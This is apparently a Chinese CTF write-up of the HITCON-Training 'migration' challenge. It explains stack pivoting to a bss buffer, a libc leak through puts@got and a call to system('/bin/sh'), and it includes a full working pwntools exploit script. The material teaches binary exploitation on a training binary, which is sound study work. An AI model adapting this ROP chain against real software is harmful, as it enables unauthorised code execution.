---
title: migration
categories:
- Hitcon-Training
---
# migration

## 前言

中期忙完之后抽两天刷题，hitcon-training的题，主要考察stack pivoting

## 程序逻辑

可以溢出的长度为0x14字节，且开头有检查，要么改掉count，要么只能挑一次Main。

![main](./1.jpg)

## 漏洞利用

最开始的想法是构造bss_addr+puts_plt+call_setvbuf_addr+puts_got泄露出返回地址，之后到call_setvbuf继续执行，ebp为bss_addr作为假的栈，在这个栈里read后再执行system函数，但是这样会报invalid address的错误，此路不通，选择更复杂的栈帧构造。

首先了解一下函数调用的规则，按照刚才的结构，溢出之后的对应是main_ebp+return_addr+fake_bep+arg1+arg2+...+code..这里的调用顺序是return_addr(args)->fake_ebp(此时的ebp为main_ebp)->code。假如code里继续调用别的函数，其规则跟上面一致，不妨设code=call_func+code_ebp+func_args，那么最终的调用情况是return_addr(args)->fake_ebp(ebp为main_ebp)->call_func(args)->code_ebp。这里还有一张图辅助了解pivoting的。

![pivot](./stackPivot.jpg)

最终的利用思路是找几个gadgets，第一次溢出的时候往buf2里写入数据，并最终跳转到buf2去执行刚才写入的数据，这里设计的结构是：
buf2+read_plt+leave_ret_addr+0+buf2+0x100，执行的时候buf2作为ebp，调用read(0,buf2,0x100),调用结束后leave 使得esp = buf2，ret 使得去执行buf2+4的代码。

buf2写入的数据用来泄露libc地址，设计的结构是：
buf + puts_plt + pop_ebx_ret + puts_got + read_plt + leave_ret_addr + 0 + buf + 0x100
执行的时候buf作为ebp，调用puts(puts@got)泄露出地址，之后的pop_ebx_ret把栈里的puts_got弹出，ret到read继续执行read(0,buf,0x100)，结束之后leave_ret使得函数跳转到buf+4执行代码

buf读取的内容包括写入'/bin/sh\x00'和执行system。设计的结构为：
buf2 + read_plt + pop_esi_edi_ebp + 0 + buf2 + 0x100 + system_addr + 'b'*4 + buf2，执行过程中先read(0,buf2,0x100)读取'/bin/sh\x00'到buf2，之后pop_esi_edi_ebp把0、buf2、0x100弹出，此时esp为system_addr，执行system("/bin/sh\x00")拿到Shell

# exp.py

```py

#coding=utf-8
from time import sleep
from pwn import *
debug = 1
context.update(arch='i386',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
p = process('./migration')
elf = ELF('./migration')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:
    gdb.attach(p,'b *0x8048505')

def exp():
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    read_plt = elf.plt['read']
    buf = 0x0804a70c
    buf2 = 0x0804a60c
    pop_ebp = 0x0804856b
    pop_ebx = 0x0804836d
    ret = 0x08048356
    pop_esi_edi_ebp = 0x08048569
    leave = 0x08048418

    p.recvuntil('Try your best :\n')
    #stack migration to buf2
    payload = 'a'*0x28 + p32(buf2)
    payload += p32(read_plt) + p32(leave) + p32(0) + p32(buf2) + p32(0x100)
    p.send(payload)
    sleep(0.1)
    #write to buf and leak libc
    payload = p32(buf) + p32(puts_plt) + p32(pop_ebx) + p32(puts_got)
    payload += p32(read_plt) + p32(leave) + p32(0) + p32(buf) + p32(0x100)
    p.send(payload)
    libc_base = u32(p.recv(4)) - libc.symbols['puts']
    log.success('libc base => ' + hex(libc_base))
    sleep(0.1)
    system_addr = libc.symbols['system'] + libc_base
    #jmp to get shell
    payload = p32(buf2) + p32(read_plt) + p32(pop_esi_edi_ebp) + p32(0) + p32(buf2) + p32(0x100)
    payload += p32(system_addr) + 'b'*4 + p32(buf2)
    p.send(payload)
    sleep(0.1)
    p.send('/bin/sh\x00')

    p.interactive()

exp()

```
